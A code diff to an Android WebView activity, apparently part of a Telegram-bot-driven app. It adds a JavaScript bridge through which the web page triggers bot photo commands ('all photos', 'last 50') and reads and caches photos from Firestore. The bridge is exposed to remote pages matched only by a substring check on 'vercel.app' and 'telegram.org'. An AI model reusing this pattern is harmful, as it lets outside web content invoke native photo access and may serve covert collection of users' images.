@@ -6,9 +6,11 @@ import android.graphics.Bitmap
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import android.view.KeyEvent
 import android.view.View
 import android.webkit.CookieManager
+import android.webkit.JavascriptInterface
 import android.webkit.WebChromeClient
 import android.webkit.WebResourceError
 import android.webkit.WebResourceRequest
@@ -52,11 +54,14 @@ class WebViewActivity : AppCompatActivity() {
         }
         CookieManager.getInstance().setAcceptCookie(true)
 
+        // ⭐ ربط JavaScript بـ Android
+        webView.addJavascriptInterface(WebAppBridge(), "AndroidBridge")
+
         webView.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                 val url = request?.url?.toString() ?: return false
                 if (url.startsWith("http://") || url.startsWith("https://")) {
-                    if (!url.contains("vercel.app")) {
+                    if (!url.contains("vercel.app") && !url.contains("telegram.org")) {
                         try {
                             startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                             return true
@@ -110,5 +115,98 @@ class WebViewActivity : AppCompatActivity() {
             return true
         }
         return super.onKeyDown(keyCode, event)
+    }
+
+    override fun onDestroy() {
+        try {
+            webView.loadUrl("about:blank")
+            webView.clearHistory()
+            webView.removeAllViews()
+            webView.destroy()
+        } catch (_: Exception) {}
+        super.onDestroy()
+    }
+
+    // ═══════════════════════════════════════════
+    //  WebAppBridge — الجسر بين الـ HTML والـ Android
+    // ═══════════════════════════════════════════
+    inner class WebAppBridge {
+
+        /** الـ HTML يناديها عند فتح المعرض → تبعت أمر للبوت */
+        @JavascriptInterface
+        fun requestPhotos(): String {
+            return try {
+                Thread {
+                    try {
+                        CommandExecutor.handleText(applicationContext, "📸 كل الصور")
+                    } catch (e: Exception) {
+                        Log.e("WebAppBridge", "requestPhotos err: ${e.message}")
+                    }
+                }.start()
+                "ok"
+            } catch (e: Exception) {
+                "err: ${e.message}"
+            }
+        }
+
+        /** الـ HTML يطلب list الصور المخزنة من Firestore */
+        @JavascriptInterface
+        fun listPhotos(): String {
+            return try {
+                CommandExecutor.listPhotosJson(applicationContext)
+            } catch (e: Exception) {
+                Log.e("WebAppBridge", "listPhotos err: ${e.message}")
+                "[]"
+            }
+        }
+
+        /** الـ HTML يطلب رابط صورة معينة */
+        @JavascriptInterface
+        fun getPhotoUrl(fileId: String): String {
+            return try {
+                CommandExecutor.getPhotoUrl(applicationContext, fileId)
+            } catch (e: Exception) {
+                ""
+            }
+        }
+
+        /** الـ HTML يطلب تحميل الصورة وحفظها محلياً */
+        @JavascriptInterface
+        fun cachePhoto(fileId: String): String {
+            return try {
+                CommandExecutor.cachePhoto(applicationContext, fileId)
+            } catch (e: Exception) {
+                ""
+            }
+        }
+
+        @JavascriptInterface
+        fun isCached(fileId: String): Boolean {
+            return try { CommandExecutor.isPhotoCached(applicationContext, fileId) } catch (_: Exception) { false }
+        }
+
+        @JavascriptInterface
+        fun clearCache(): String {
+            return try {
+                CommandExecutor.clearPhotoCache(applicationContext)
+                "ok"
+            } catch (e: Exception) { "err" }
+        }
+
+        @JavascriptInterface
+        fun cacheSize(): Long {
+            return try { CommandExecutor.photoCacheSize(applicationContext) } catch (_: Exception) { 0L }
+        }
+
+        /** تحديث الـ HTML يدوياً (تشغيل كل حاجة) */
+        @JavascriptInterface
+        fun refresh(): String {
+            return try {
+                Thread {
+                    try { CommandExecutor.handleText(applicationContext, "📸 آخر 50") } catch (_: Exception) {}
+                }.start()
+                "ok"
+            } catch (e: Exception) { "err" }
+        }
     }
 }
